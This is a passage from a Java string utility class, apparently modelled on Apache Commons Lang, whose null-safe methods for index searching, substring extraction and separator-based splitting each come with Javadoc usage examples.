    public static int lastIndexOf(String str, char searchChar, int startPos) {
	if (isEmpty(str)) {
	    return INDEX_NOT_FOUND;
	}
	return str.lastIndexOf(searchChar, startPos);
    }

    /**
     * <p>
     * Finds the last index within a String, handling <code>null</code>. This method
     * uses {@link String#lastIndexOf(String)}.
     * </p>
     *
     * <p>
     * A <code>null</code> String will return <code>-1</code>.
     * </p>
     *
     * <pre>
     * StrUtils.lastIndexOf(null, *)          = -1
     * StrUtils.lastIndexOf(*, null)          = -1
     * StrUtils.lastIndexOf("", "")           = 0
     * StrUtils.lastIndexOf("aabaabaa", "a")  = 7
     * StrUtils.lastIndexOf("aabaabaa", "b")  = 5
     * StrUtils.lastIndexOf("aabaabaa", "ab") = 4
     * StrUtils.lastIndexOf("aabaabaa", "")   = 8
     * </pre>
     *
     * @param str       the String to check, may be null
     * @param searchStr the String to find, may be null
     * @return the last index of the search String, -1 if no match or
     *         <code>null</code> string input
     * @since 2.0
     */
    public static int lastIndexOf(String str, String searchStr) {
	if (str == null || searchStr == null) {
	    return INDEX_NOT_FOUND;
	}
	return str.lastIndexOf(searchStr);
    }

    /**
     * <p>
     * Finds the n-th last index within a String, handling <code>null</code>. This
     * method uses {@link String#lastIndexOf(String)}.
     * </p>
     *
     * <p>
     * A <code>null</code> String will return <code>-1</code>.
     * </p>
     *
     * <pre>
     * StrUtils.lastOrdinalIndexOf(null, *, *)          = -1
     * StrUtils.lastOrdinalIndexOf(*, null, *)          = -1
     * StrUtils.lastOrdinalIndexOf("", "", *)           = 0
     * StrUtils.lastOrdinalIndexOf("aabaabaa", "a", 1)  = 7
     * StrUtils.lastOrdinalIndexOf("aabaabaa", "a", 2)  = 6
     * StrUtils.lastOrdinalIndexOf("aabaabaa", "b", 1)  = 5
     * StrUtils.lastOrdinalIndexOf("aabaabaa", "b", 2)  = 2
     * StrUtils.lastOrdinalIndexOf("aabaabaa", "ab", 1) = 4
     * StrUtils.lastOrdinalIndexOf("aabaabaa", "ab", 2) = 1
     * StrUtils.lastOrdinalIndexOf("aabaabaa", "", 1)   = 8
     * StrUtils.lastOrdinalIndexOf("aabaabaa", "", 2)   = 8
     * </pre>
     *
     * <p>
     * Note that 'tail(String str, int n)' may be implemented as:
     * </p>
     *
     * <pre>
     * str.substring(lastOrdinalIndexOf(str, "\n", n) + 1)
     * </pre>
     *
     * @param str       the String to check, may be null
     * @param searchStr the String to find, may be null
     * @param ordinal   the n-th last <code>searchStr</code> to find
     * @return the n-th last index of the search String, <code>-1</code>
     *         (<code>INDEX_NOT_FOUND</code>) if no match or <code>null</code>
     *         string input
     * @since 2.5
     */
    public static int lastOrdinalIndexOf(String str, String searchStr, int ordinal) {
	return ordinalIndexOf(str, searchStr, ordinal, true);
    }

    /**
     * <p>
     * Finds the first index within a String, handling <code>null</code>. This
     * method uses {@link String#lastIndexOf(String, int)}.
     * </p>
     *
     * <p>
     * A <code>null</code> String will return <code>-1</code>. A negative start
     * position returns <code>-1</code>. An empty ("") search String always matches
     * unless the start position is negative. A start position greater than the
     * string length searches the whole string.
     * </p>
     *
     * <pre>
     * StrUtils.lastIndexOf(null, *, *)          = -1
     * StrUtils.lastIndexOf(*, null, *)          = -1
     * StrUtils.lastIndexOf("aabaabaa", "a", 8)  = 7
     * StrUtils.lastIndexOf("aabaabaa", "b", 8)  = 5
     * StrUtils.lastIndexOf("aabaabaa", "ab", 8) = 4
     * StrUtils.lastIndexOf("aabaabaa", "b", 9)  = 5
     * StrUtils.lastIndexOf("aabaabaa", "b", -1) = -1
     * StrUtils.lastIndexOf("aabaabaa", "a", 0)  = 0
     * StrUtils.lastIndexOf("aabaabaa", "b", 0)  = -1
     * </pre>
     *
     * @param str       the String to check, may be null
     * @param searchStr the String to find, may be null
     * @param startPos  the start position, negative treated as zero
     * @return the first index of the search String, -1 if no match or
     *         <code>null</code> string input
     * @since 2.0
     */
    public static int lastIndexOf(String str, String searchStr, int startPos) {
	if (str == null || searchStr == null) {
	    return INDEX_NOT_FOUND;
	}
	return str.lastIndexOf(searchStr, startPos);
    }

    /**
     * <p>
     * Case in-sensitive find of the last index within a String.
     * </p>
     *
     * <p>
     * A <code>null</code> String will return <code>-1</code>. A negative start
     * position returns <code>-1</code>. An empty ("") search String always matches
     * unless the start position is negative. A start position greater than the
     * string length searches the whole string.
     * </p>
     *
     * <pre>
     * StrUtils.lastIndexOfIgnoreCase(null, *)          = -1
     * StrUtils.lastIndexOfIgnoreCase(*, null)          = -1
     * StrUtils.lastIndexOfIgnoreCase("aabaabaa", "A")  = 7
     * StrUtils.lastIndexOfIgnoreCase("aabaabaa", "B")  = 5
     * StrUtils.lastIndexOfIgnoreCase("aabaabaa", "AB") = 4
     * </pre>
     *
     * @param str       the String to check, may be null
     * @param searchStr the String to find, may be null
     * @return the first index of the search String, -1 if no match or
     *         <code>null</code> string input
     * @since 2.5
     */
    public static int lastIndexOfIgnoreCase(String str, String searchStr) {
	if (str == null || searchStr == null) {
	    return INDEX_NOT_FOUND;
	}
	return lastIndexOfIgnoreCase(str, searchStr, str.length());
    }

    /**
     * <p>
     * Case in-sensitive find of the last index within a String from the specified
     * position.
     * </p>
     *
     * <p>
     * A <code>null</code> String will return <code>-1</code>. A negative start
     * position returns <code>-1</code>. An empty ("") search String always matches
     * unless the start position is negative. A start position greater than the
     * string length searches the whole string.
     * </p>
     *
     * <pre>
     * StrUtils.lastIndexOfIgnoreCase(null, *, *)          = -1
     * StrUtils.lastIndexOfIgnoreCase(*, null, *)          = -1
     * StrUtils.lastIndexOfIgnoreCase("aabaabaa", "A", 8)  = 7
     * StrUtils.lastIndexOfIgnoreCase("aabaabaa", "B", 8)  = 5
     * StrUtils.lastIndexOfIgnoreCase("aabaabaa", "AB", 8) = 4
     * StrUtils.lastIndexOfIgnoreCase("aabaabaa", "B", 9)  = 5
     * StrUtils.lastIndexOfIgnoreCase("aabaabaa", "B", -1) = -1
     * StrUtils.lastIndexOfIgnoreCase("aabaabaa", "A", 0)  = 0
     * StrUtils.lastIndexOfIgnoreCase("aabaabaa", "B", 0)  = -1
     * </pre>
     *
     * @param str       the String to check, may be null
     * @param searchStr the String to find, may be null
     * @param startPos  the start position
     * @return the first index of the search String, -1 if no match or
     *         <code>null</code> string input
     * @since 2.5
     */
    public static int lastIndexOfIgnoreCase(String str, String searchStr, int startPos) {
	if (str == null || searchStr == null) {
	    return INDEX_NOT_FOUND;
	}
	if (startPos > (str.length() - searchStr.length())) {
	    startPos = str.length() - searchStr.length();
	}
	if (startPos < 0) {
	    return INDEX_NOT_FOUND;
	}
	if (searchStr.length() == 0) {
	    return startPos;
	}

	for (int i = startPos; i >= 0; i--) {
	    if (str.regionMatches(true, i, searchStr, 0, searchStr.length())) {
		return i;
	    }
	}
	return INDEX_NOT_FOUND;
    }

    // Contains
    // -----------------------------------------------------------------------
    /**
     * <p>
     * Checks if String contains a search character, handling <code>null</code>.
     * This method uses {@link String#indexOf(int)}.
     * </p>
     *
     * <p>
     * A <code>null</code> or empty ("") String will return <code>false</code>.
     * </p>
     *
     * <pre>
     * StrUtils.contains(null, *)    = false
     * StrUtils.contains("", *)      = false
     * StrUtils.contains("abc", 'a') = true
     * StrUtils.contains("abc", 'z') = false
     * </pre>
     *
     * @param str        the String to check, may be null
     * @param searchChar the character to find
     * @return true if the String contains the search character, false if not or
     *         <code>null</code> string input
     * @since 2.0
     */
    public static boolean contains(String str, char searchChar) {
	if (isEmpty(str)) {
	    return false;
	}
	return str.indexOf(searchChar) >= 0;
    }

    /**
     * <p>
     * Checks if String contains a search String, handling <code>null</code>. This
     * method uses {@link String#indexOf(String)}.
     * </p>
     *
     * <p>
     * A <code>null</code> String will return <code>false</code>.
     * </p>
     *
     * <pre>
     * StrUtils.contains(null, *)     = false
     * StrUtils.contains(*, null)     = false
     * StrUtils.contains("", "")      = true
     * StrUtils.contains("abc", "")   = true
     * StrUtils.contains("abc", "a")  = true
     * StrUtils.contains("abc", "z")  = false
     * </pre>
     *
     * @param str       the String to check, may be null
     * @param searchStr the String to find, may be null
     * @return true if the String contains the search String, false if not or
     *         <code>null</code> string input
     * @since 2.0
     */
    public static boolean contains(String str, String searchStr) {
	if (str == null || searchStr == null) {
	    return false;
	}
	return str.indexOf(searchStr) >= 0;
    }

    /**
     * <p>
     * Checks if String contains a search String irrespective of case, handling
     * <code>null</code>. Case-insensitivity is defined as by
     * {@link String#equalsIgnoreCase(String)}.
     *
     * <p>
     * A <code>null</code> String will return <code>false</code>.
     * </p>
     *
     * <pre>
     * StrUtils.contains(null, *) = false
     * StrUtils.contains(*, null) = false
     * StrUtils.contains("", "") = true
     * StrUtils.contains("abc", "") = true
     * StrUtils.contains("abc", "a") = true
     * StrUtils.contains("abc", "z") = false
     * StrUtils.contains("abc", "A") = true
     * StrUtils.contains("abc", "Z") = false
     * </pre>
     *
     * @param str       the String to check, may be null
     * @param searchStr the String to find, may be null
     * @return true if the String contains the search String irrespective of case or
     *         false if not or <code>null</code> string input
     */
    public static boolean containsIgnoreCase(String str, String searchStr) {
	if (str == null || searchStr == null) {
	    return false;
	}
	int len = searchStr.length();
	int max = str.length() - len;
	for (int i = 0; i <= max; i++) {
	    if (str.regionMatches(true, i, searchStr, 0, len)) {
		return true;
	    }
	}
	return false;
    }

    // IndexOfAny strings
    // -----------------------------------------------------------------------
    /**
     * <p>
     * Find the first index of any of a set of potential substrings.
     * </p>
     *
     * <p>
     * A <code>null</code> String will return <code>-1</code>. A <code>null</code>
     * or zero length search array will return <code>-1</code>. A <code>null</code>
     * search array entry will be ignored, but a search array containing "" will
     * return <code>0</code> if <code>str</code> is not null. This method uses
     * {@link String#indexOf(String)}.
     * </p>
     *
     * <pre>
     * StrUtils.indexOfAny(null, *)                     = -1
     * StrUtils.indexOfAny(*, null)                     = -1
     * StrUtils.indexOfAny(*, [])                       = -1
     * StrUtils.indexOfAny("zzabyycdxx", ["ab","cd"])   = 2
     * StrUtils.indexOfAny("zzabyycdxx", ["cd","ab"])   = 2
     * StrUtils.indexOfAny("zzabyycdxx", ["mn","op"])   = -1
     * StrUtils.indexOfAny("zzabyycdxx", ["zab","aby"]) = 1
     * StrUtils.indexOfAny("zzabyycdxx", [""])          = 0
     * StrUtils.indexOfAny("", [""])                    = 0
     * StrUtils.indexOfAny("", ["a"])                   = -1
     * </pre>
     *
     * @param str        the String to check, may be null
     * @param searchStrs the Strings to search for, may be null
     * @return the first index of any of the searchStrs in str, -1 if no match
     */
    public static int indexOfAny(String str, String[] searchStrs) {
	if ((str == null) || (searchStrs == null)) {
	    return INDEX_NOT_FOUND;
	}
	int sz = searchStrs.length;

	// String's can't have a MAX_VALUEth index.
	int ret = Integer.MAX_VALUE;

	int tmp = 0;
	for (int i = 0; i < sz; i++) {
	    String search = searchStrs[i];
	    if (search == null) {
		continue;
	    }
	    tmp = str.indexOf(search);
	    if (tmp == INDEX_NOT_FOUND) {
		continue;
	    }

	    if (tmp < ret) {
		ret = tmp;
	    }
	}

	return (ret == Integer.MAX_VALUE) ? INDEX_NOT_FOUND : ret;
    }

    /**
     * <p>
     * Find the latest index of any of a set of potential substrings.
     * </p>
     *
     * <p>
     * A <code>null</code> String will return <code>-1</code>. A <code>null</code>
     * search array will return <code>-1</code>. A <code>null</code> or zero length
     * search array entry will be ignored, but a search array containing "" will
     * return the length of <code>str</code> if <code>str</code> is not null. This
     * method uses {@link String#indexOf(String)}
     * </p>
     *
     * <pre>
     * StrUtils.lastIndexOfAny(null, *)                   = -1
     * StrUtils.lastIndexOfAny(*, null)                   = -1
     * StrUtils.lastIndexOfAny(*, [])                     = -1
     * StrUtils.lastIndexOfAny(*, [null])                 = -1
     * StrUtils.lastIndexOfAny("zzabyycdxx", ["ab","cd"]) = 6
     * StrUtils.lastIndexOfAny("zzabyycdxx", ["cd","ab"]) = 6
     * StrUtils.lastIndexOfAny("zzabyycdxx", ["mn","op"]) = -1
     * StrUtils.lastIndexOfAny("zzabyycdxx", ["mn","op"]) = -1
     * StrUtils.lastIndexOfAny("zzabyycdxx", ["mn",""])   = 10
     * </pre>
     *
     * @param str        the String to check, may be null
     * @param searchStrs the Strings to search for, may be null
     * @return the last index of any of the Strings, -1 if no match
     */
    public static int lastIndexOfAny(String str, String[] searchStrs) {
	if ((str == null) || (searchStrs == null)) {
	    return INDEX_NOT_FOUND;
	}
	int sz = searchStrs.length;
	int ret = INDEX_NOT_FOUND;
	int tmp = 0;
	for (int i = 0; i < sz; i++) {
	    String search = searchStrs[i];
	    if (search == null) {
		continue;
	    }
	    tmp = str.lastIndexOf(search);
	    if (tmp > ret) {
		ret = tmp;
	    }
	}
	return ret;
    }

    // Substring
    // -----------------------------------------------------------------------
    /**
     * <p>
     * Gets a substring from the specified String avoiding exceptions.
     * </p>
     *
     * <p>
     * A negative start position can be used to start <code>n</code> characters from
     * the end of the String.
     * </p>
     *
     * <p>
     * A <code>null</code> String will return <code>null</code>. An empty ("")
     * String will return "".
     * </p>
     *
     * <pre>
     * StrUtils.substring(null, *)   = null
     * StrUtils.substring("", *)     = ""
     * StrUtils.substring("abc", 0)  = "abc"
     * StrUtils.substring("abc", 2)  = "c"
     * StrUtils.substring("abc", 4)  = ""
     * StrUtils.substring("abc", -2) = "bc"
     * StrUtils.substring("abc", -4) = "abc"
     * </pre>
     *
     * @param str   the String to get the substring from, may be null
     * @param start the position to start from, negative means count back from the
     *              end of the String by this many characters
     * @return substring from start position, <code>null</code> if null String input
     */
    public static String substring(String str, int start) {
	if (str == null) {
	    return null;
	}

	// handle negatives, which means last n characters
	if (start < 0) {
	    start = str.length() + start; // remember start is negative
	}

	if (start < 0) {
	    start = 0;
	}
	if (start > str.length()) {
	    return EMPTY;
	}

	return str.substring(start);
    }

    /**
     * <p>
     * Gets a substring from the specified String avoiding exceptions.
     * </p>
     *
     * <p>
     * A negative start position can be used to start/end <code>n</code> characters
     * from the end of the String.
     * </p>
     *
     * <p>
     * The returned substring starts with the character in the <code>start</code>
     * position and ends before the <code>end</code> position. All position counting
     * is zero-based -- i.e., to start at the beginning of the string use
     * <code>start = 0</code>. Negative start and end positions can be used to
     * specify offsets relative to the end of the String.
     * </p>
     *
     * <p>
     * If <code>start</code> is not strictly to the left of <code>end</code>, "" is
     * returned.
     * </p>
     *
     * <pre>
     * StrUtils.substring(null, *, *)    = null
     * StrUtils.substring("", * ,  *)    = "";
     * StrUtils.substring("abc", 0, 2)   = "ab"
     * StrUtils.substring("abc", 2, 0)   = ""
     * StrUtils.substring("abc", 2, 4)   = "c"
     * StrUtils.substring("abc", 4, 6)   = ""
     * StrUtils.substring("abc", 2, 2)   = ""
     * StrUtils.substring("abc", -2, -1) = "b"
     * StrUtils.substring("abc", -4, 2)  = "ab"
     * </pre>
     *
     * @param str   the String to get the substring from, may be null
     * @param start the position to start from, negative means count back from the
     *              end of the String by this many characters
     * @param end   the position to end at (exclusive), negative means count back
     *              from the end of the String by this many characters
     * @return substring from start position to end positon, <code>null</code> if
     *         null String input
     */
    public static String substring(String str, int start, int end) {
	if (str == null) {
	    return null;
	}

	// handle negatives
	if (end < 0) {
	    end = str.length() + end; // remember end is negative
	}
	if (start < 0) {
	    start = str.length() + start; // remember start is negative
	}

	// check length next
	if (end > str.length()) {
	    end = str.length();
	}

	// if start is greater than end, return ""
	if (start > end) {
	    return EMPTY;
	}

	if (start < 0) {
	    start = 0;
	}
	if (end < 0) {
	    end = 0;
	}

	return str.substring(start, end);
    }

    // Left/Right/Mid
    // -----------------------------------------------------------------------
    /**
     * <p>
     * Gets the leftmost <code>len</code> characters of a String.
     * </p>
     *
     * <p>
     * If <code>len</code> characters are not available, or the String is
     * <code>null</code>, the String will be returned without an exception. An empty
     * String is returned if len is negative.
     * </p>
     *
     * <pre>
     * StrUtils.left(null, *)    = null
     * StrUtils.left(*, -ve)     = ""
     * StrUtils.left("", *)      = ""
     * StrUtils.left("abc", 0)   = ""
     * StrUtils.left("abc", 2)   = "ab"
     * StrUtils.left("abc", 4)   = "abc"
     * </pre>
     *
     * @param str the String to get the leftmost characters from, may be null
     * @param len the length of the required String
     * @return the leftmost characters, <code>null</code> if null String input
     */
    public static String left(String str, int len) {
	if (str == null) {
	    return null;
	}
	if (len < 0) {
	    return EMPTY;
	}
	if (str.length() <= len) {
	    return str;
	}
	return str.substring(0, len);
    }

    /**
     * <p>
     * Gets the rightmost <code>len</code> characters of a String.
     * </p>
     *
     * <p>
     * If <code>len</code> characters are not available, or the String is
     * <code>null</code>, the String will be returned without an an exception. An
     * empty String is returned if len is negative.
     * </p>
     *
     * <pre>
     * StrUtils.right(null, *)    = null
     * StrUtils.right(*, -ve)     = ""
     * StrUtils.right("", *)      = ""
     * StrUtils.right("abc", 0)   = ""
     * StrUtils.right("abc", 2)   = "bc"
     * StrUtils.right("abc", 4)   = "abc"
     * </pre>
     *
     * @param str the String to get the rightmost characters from, may be null
     * @param len the length of the required String
     * @return the rightmost characters, <code>null</code> if null String input
     */
    public static String right(String str, int len) {
	if (str == null) {
	    return null;
	}
	if (len < 0) {
	    return EMPTY;
	}
	if (str.length() <= len) {
	    return str;
	}
	return str.substring(str.length() - len);
    }

    /**
     * <p>
     * Gets <code>len</code> characters from the middle of a String.
     * </p>
     *
     * <p>
     * If <code>len</code> characters are not available, the remainder of the String
     * will be returned without an exception. If the String is <code>null</code>,
     * <code>null</code> will be returned. An empty String is returned if len is
     * negative or exceeds the length of <code>str</code>.
     * </p>
     *
     * <pre>
     * StrUtils.mid(null, *, *)    = null
     * StrUtils.mid(*, *, -ve)     = ""
     * StrUtils.mid("", 0, *)      = ""
     * StrUtils.mid("abc", 0, 2)   = "ab"
     * StrUtils.mid("abc", 0, 4)   = "abc"
     * StrUtils.mid("abc", 2, 4)   = "c"
     * StrUtils.mid("abc", 4, 2)   = ""
     * StrUtils.mid("abc", -2, 2)  = "ab"
     * </pre>
     *
     * @param str the String to get the characters from, may be null
     * @param pos the position to start from, negative treated as zero
     * @param len the length of the required String
     * @return the middle characters, <code>null</code> if null String input
     */
    public static String mid(String str, int pos, int len) {
	if (str == null) {
	    return null;
	}
	if (len < 0 || pos > str.length()) {
	    return EMPTY;
	}
	if (pos < 0) {
	    pos = 0;
	}
	if (str.length() <= (pos + len)) {
	    return str.substring(pos);
	}
	return str.substring(pos, pos + len);
    }

    // SubStringAfter/SubStringBefore
    // -----------------------------------------------------------------------
    /**
     * <p>
     * Gets the substring before the first occurrence of a separator. The separator
     * is not returned.
     * </p>
     *
     * <p>
     * A <code>null</code> string input will return <code>null</code>. An empty ("")
     * string input will return the empty string. A <code>null</code> separator will
     * return the input string.
     * </p>
     *
     * <p>
     * If nothing is found, the string input is returned.
     * </p>
     *
     * <pre>
     * StrUtils.substringBefore(null, *)      = null
     * StrUtils.substringBefore("", *)        = ""
     * StrUtils.substringBefore("abc", "a")   = ""
     * StrUtils.substringBefore("abcba", "b") = "a"
     * StrUtils.substringBefore("abc", "c")   = "ab"
     * StrUtils.substringBefore("abc", "d")   = "abc"
     * StrUtils.substringBefore("abc", "")    = ""
     * StrUtils.substringBefore("abc", null)  = "abc"
     * </pre>
     *
     * @param str       the String to get a substring from, may be null
     * @param separator the String to search for, may be null
     * @return the substring before the first occurrence of the separator,
     *         <code>null</code> if null String input
     * @since 2.0
     */
    public static String substringBefore(String str, String separator) {
	if (isEmpty(str) || separator == null) {
	    return str;
	}
	if (separator.length() == 0) {
	    return EMPTY;
	}
	int pos = str.indexOf(separator);
	if (pos == INDEX_NOT_FOUND) {
	    return str;
	}
	return str.substring(0, pos);
    }

    /**
     * <p>
     * Gets the substring after the first occurrence of a separator. The separator
     * is not returned.
     * </p>
     *
     * <p>
     * A <code>null</code> string input will return <code>null</code>. An empty ("")
     * string input will return the empty string. A <code>null</code> separator will
     * return the empty string if the input string is not <code>null</code>.
     * </p>
     *
     * <p>
     * If nothing is found, the empty string is returned.
     * </p>
     *
     * <pre>
     * StrUtils.substringAfter(null, *)      = null
     * StrUtils.substringAfter("", *)        = ""
     * StrUtils.substringAfter(*, null)      = ""
     * StrUtils.substringAfter("abc", "a")   = "bc"
     * StrUtils.substringAfter("abcba", "b") = "cba"
     * StrUtils.substringAfter("abc", "c")   = ""
     * StrUtils.substringAfter("abc", "d")   = ""
     * StrUtils.substringAfter("abc", "")    = "abc"
     * </pre>
     *
     * @param str       the String to get a substring from, may be null
     * @param separator the String to search for, may be null
     * @return the substring after the first occurrence of the separator,
     *         <code>null</code> if null String input
     * @since 2.0
     */
    public static String substringAfter(String str, String separator) {
	if (isEmpty(str)) {
	    return str;
	}
	if (separator == null) {
	    return EMPTY;
	}
	int pos = str.indexOf(separator);
	if (pos == INDEX_NOT_FOUND) {
	    return EMPTY;
	}
	return str.substring(pos + separator.length());
    }

    /**
     * <p>
     * Gets the substring before the last occurrence of a separator. The separator
     * is not returned.
     * </p>
     *
     * <p>
     * A <code>null</code> string input will return <code>null</code>. An empty ("")
     * string input will return the empty string. An empty or <code>null</code>
     * separator will return the input string.
     * </p>
     *
     * <p>
     * If nothing is found, the string input is returned.
     * </p>
     *
     * <pre>
     * StrUtils.substringBeforeLast(null, *)      = null
     * StrUtils.substringBeforeLast("", *)        = ""
     * StrUtils.substringBeforeLast("abcba", "b") = "abc"
     * StrUtils.substringBeforeLast("abc", "c")   = "ab"
     * StrUtils.substringBeforeLast("a", "a")     = ""
     * StrUtils.substringBeforeLast("a", "z")     = "a"
     * StrUtils.substringBeforeLast("a", null)    = "a"
     * StrUtils.substringBeforeLast("a", "")      = "a"
     * </pre>
     *
     * @param str       the String to get a substring from, may be null
     * @param separator the String to search for, may be null
     * @return the substring before the last occurrence of the separator,
     *         <code>null</code> if null String input
     * @since 2.0
     */
    public static String substringBeforeLast(String str, String separator) {
	if (isEmpty(str) || isEmpty(separator)) {
	    return str;
	}
	int pos = str.lastIndexOf(separator);
	if (pos == INDEX_NOT_FOUND) {
	    return str;
	}
	return str.substring(0, pos);
    }

    /**
     * <p>
     * Gets the substring after the last occurrence of a separator. The separator is
     * not returned.
     * </p>
     *
     * <p>
     * A <code>null</code> string input will return <code>null</code>. An empty ("")
     * string input will return the empty string. An empty or <code>null</code>
     * separator will return the empty string if the input string is not
     * <code>null</code>.
     * </p>
     *
     * <p>
     * If nothing is found, the empty string is returned.
     * </p>
     *
     * <pre>
     * StrUtils.substringAfterLast(null, *)      = null
     * StrUtils.substringAfterLast("", *)        = ""
     * StrUtils.substringAfterLast(*, "")        = ""
     * StrUtils.substringAfterLast(*, null)      = ""
     * StrUtils.substringAfterLast("abc", "a")   = "bc"
     * StrUtils.substringAfterLast("abcba", "b") = "a"
     * StrUtils.substringAfterLast("abc", "c")   = ""
     * StrUtils.substringAfterLast("a", "a")     = ""
     * StrUtils.substringAfterLast("a", "z")     = ""
     * </pre>
     *
     * @param str       the String to get a substring from, may be null
     * @param separator the String to search for, may be null
     * @return the substring after the last occurrence of the separator,
     *         <code>null</code> if null String input
     * @since 2.0
     */
    public static String substringAfterLast(String str, String separator) {
	if (isEmpty(str)) {
	    return str;
	}
	if (isEmpty(separator)) {
	    return EMPTY;
	}
	int pos = str.lastIndexOf(separator);
	if (pos == INDEX_NOT_FOUND || pos == (str.length() - separator.length())) {
	    return EMPTY;
	}
	return str.substring(pos + separator.length());
    }

    // Substring between
    // -----------------------------------------------------------------------
    /**
     * <p>
     * Gets the String that is nested in between two instances of the same String.
     * </p>
     *
     * <p>
     * A <code>null</code> input String returns <code>null</code>. A
     * <code>null</code> tag returns <code>null</code>.
     * </p>
     *
     * <pre>
     * StrUtils.substringBetween(null, *)            = null
     * StrUtils.substringBetween("", "")             = ""
     * StrUtils.substringBetween("", "tag")          = null
     * StrUtils.substringBetween("tagabctag", null)  = null
     * StrUtils.substringBetween("tagabctag", "")    = ""
     * StrUtils.substringBetween("tagabctag", "tag") = "abc"
     * </pre>
     *
     * @param str the String containing the substring, may be null
     * @param tag the String before and after the substring, may be null
     * @return the substring, <code>null</code> if no match
     * @since 2.0
     */
    public static String substringBetween(String str, String tag) {
	return substringBetween(str, tag, tag);
    }

    /**
     * <p>
     * Gets the String that is nested in between two Strings. Only the first match
     * is returned.
     * </p>
     *
     * <p>
     * A <code>null</code> input String returns <code>null</code>. A
     * <code>null</code> open/close returns <code>null</code> (no match). An empty
     * ("") open and close returns an empty string.
     * </p>
     *
     * <pre>
     * StrUtils.substringBetween("wx[b]yz", "[", "]") = "b"
     * StrUtils.substringBetween(null, *, *)          = null
     * StrUtils.substringBetween(*, null, *)          = null
     * StrUtils.substringBetween(*, *, null)          = null
     * StrUtils.substringBetween("", "", "")          = ""
     * StrUtils.substringBetween("", "", "]")         = null
     * StrUtils.substringBetween("", "[", "]")        = null
     * StrUtils.substringBetween("yabcz", "", "")     = ""
     * StrUtils.substringBetween("yabcz", "y", "z")   = "abc"
     * StrUtils.substringBetween("yabczyabcz", "y", "z")   = "abc"
     * </pre>
     *
     * @param str   the String containing the substring, may be null
     * @param open  the String before the substring, may be null
     * @param close the String after the substring, may be null
     * @return the substring, <code>null</code> if no match
     * @since 2.0
     */
    public static String substringBetween(String str, String open, String close) {
	if (str == null || open == null || close == null) {
	    return null;
	}
	int start = str.indexOf(open);
	if (start != INDEX_NOT_FOUND) {
	    int end = str.indexOf(close, start + open.length());
	    if (end != INDEX_NOT_FOUND) {
		return str.substring(start + open.length(), end);
	    }
	}
	return null;
    }

}